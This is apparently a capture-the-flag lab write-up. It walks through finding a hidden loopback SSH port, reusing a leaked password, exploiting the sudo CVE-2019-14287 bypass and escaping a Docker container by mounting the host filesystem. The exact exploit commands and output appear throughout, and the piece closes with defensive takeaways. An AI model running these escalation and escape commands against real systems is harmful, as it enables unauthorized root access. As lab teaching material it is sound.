Docker Escape: a hidden port, a sudo bypass, and a stray binary

A failed SSH login on the obvious loopback port, a second service hiding on a nonstandard one, a sudo rule that looks safe until you read the version number, and a leftover docker binary that happily mounts the entire host filesystem for you.

Room: Docker Container Category: Linux Privesc / Containers Tools: ssh, sudo, docker

The setup: already on the target as a low-privilege user, with one known account's credentials that don't work on the obvious port. The job: find where those credentials actually work, then escalate all the way to the host.

No single flag in these notes, the objective is a root shell with host filesystem access.

The Investigation

1
The obvious SSH login fails

Trying robert's known password against the local loopback address first:

maya@linuxagency:~/.ssh$ ssh robert@127.0.0.1
ssh robert@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:NPQ78ILJE6Ra+F9r/z2ZUWdpPGeAHnuNAc5kOaFbTjU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
robert@127.0.0.1's password: industryweapon

Permission denied, please try again.
robert@127.0.0.1's password:

Permission denied, please try again.
Why this works

A rejected password for a known-valid account on the expected port is a strong sign the account exists somewhere else on the box, not that the credential is wrong. Worth checking what else is listening before assuming the password is bad.

2
Find the real port by reading /proc directly

Rather than scanning from outside, /proc/net/tcp lists every listening socket on the box in hex:

penelope@linuxagency:/home/agent47$ cat /proc/net/tcp
 sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
  0: 0100007F:9E89 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 21799
  1: 0100007F:08AE 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 23100
  2: 0100007F:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 21510
  3: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 19246
  4: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 21085
  5: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25586
  6: 5BAB0A0A:0016 1539020A:D002 01 00000000:00000000 02:000A461B 00000000     0        0 24015

The local address column is little-endian hex: 127.0.0.1 is 0100007F, and the port is the last field after the colon. 08AE converts to 2222 decimal, a second SSH-like service on a non-default port, hiding on loopback only.

Why this works

/proc/net/tcp shows every socket a process on the box can see, including ones bound only to 127.0.0.1 that would never show up in an external nmap scan. It's one of the most reliable ways to find a service deliberately hidden from the outside.

3
The same credentials work on the hidden port
maya@linuxagency:~/.ssh$ ssh robert@127.0.0.1 -p2222
ssh robert@127.0.0.1 -p2222
robert@127.0.0.1's password: industryweapon

Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
robert@ec96850005d6:~$

The hostname, ec96850005d6, a 12-character hex string, is the giveaway: that's a Docker container ID format, not a normal hostname. This login landed inside a container, not on the host.

Why this works

Password reuse across services is common even when the services live on different ports or different machines entirely. The hostname format here is also a useful tell on its own: default Docker container hostnames are short hex strings, a strong signal about what kind of box you just landed on.

4
A sudo rule, and the version that breaks it
robert@ec96850005d6:~$ sudo -l
User robert may run the following commands on ec96850005d6:
    (ALL, !root) NOPASSWD: /bin/bash

At first glance (ALL, !root) looks like it blocks running as root specifically. Checking the sudo version confirms this box is vulnerable to the bypass for exactly that pattern:

robert@ec96850005d6:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
Why this works

Sudo versions before 1.8.28 resolve a user ID of -1 (or its unsigned equivalent, 4294967295) to 0, root, due to a signedness bug in how the ID is cast. A rule written to explicitly exclude root by name doesn't account for specifying root by that numeric trick instead.

5
Trigger the bypass
robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@ec96850005d6:~#
Why this works

This is CVE-2019-14287. -u#-1 asks sudo to run as the numeric UID -1, which the vulnerable version casts straight to 0, root, despite the sudoers rule saying !root.

6
Find a leftover docker binary inside the container
root@ec96850005d6:~# find / -name docker 2>/dev/null
/run/docker
/tmp/docker

root@ec96850005d6:~# /tmp/docker images
/tmp/docker/images
bash: /tmp/docker/images: Not a directory
root@ec96850005d6:/mnt# /tmp/docker images
/tmp/docker images
REPOSITORY   TAG      IMAGE ID       CREATED      SIZE
mangoman     latest   b5f279024ce0   4 months ago 213MB

A working docker client binary sitting at /tmp/docker, fully root-capable now, can talk to a Docker daemon it has access to.

Why this works

A Docker client only needs a reachable daemon socket to issue commands, including commands that create a brand-new container with whatever mounts are requested. Finding the binary is the whole battle; the daemon behind it doesn't care that the request originated from inside another container.

7
Mount the host filesystem into a new container
root@ec96850005d6:/mnt# /tmp/docker run -it -v /:/host/ b5f279024ce0 chroot /host/ bash
<run -it -v /:/host/ b5f279024ce0 chroot /host/ bash>
root@4c75983f8a06:/# pwd

The hostname changes again, now inside the newly created container, which has the host filesystem mounted at /host and chroot'd into as its root. Every file on the real host is now reachable.

Why this works

Mounting / (the host's root) into a new container and then chroot-ing into it collapses the container boundary entirely. Anyone who can run arbitrary docker run -v commands, whether from inside a container or not, can mount and access anything the Docker daemon's own host can see.

Full Attack Chain

SSH to 127.0.0.1 with known creds → denied (wrong port)
  → /proc/net/tcp reveals a hidden service on 127.0.0.1:2222
       → same creds work there, lands inside a Docker container
            → sudo -l shows (ALL, !root) NOPASSWD: /bin/bash on sudo 1.8.21p2
                 → CVE-2019-14287: sudo -u#-1 /bin/bash → root inside the container
                      → find / -name docker → a leftover client binary at /tmp/docker
                           → docker run -v /:/host/ ... chroot /host/ bash → full host filesystem access

Takeaways

Loopback-only services aren't invisible to a local user

Binding a service to 127.0.0.1 hides it from the network, not from anyone who already has a shell and can read /proc/net/tcp.

Exclusion rules in sudoers need the version to back them up

!root looks airtight until the sudo version in use has a known bypass for exactly that pattern. Patch level matters as much as the rule's wording.

A leftover client binary is as dangerous as a misconfigured daemon

Nothing about the Docker daemon itself was attacked here. A forgotten client binary with daemon access was enough to walk straight out of the container.
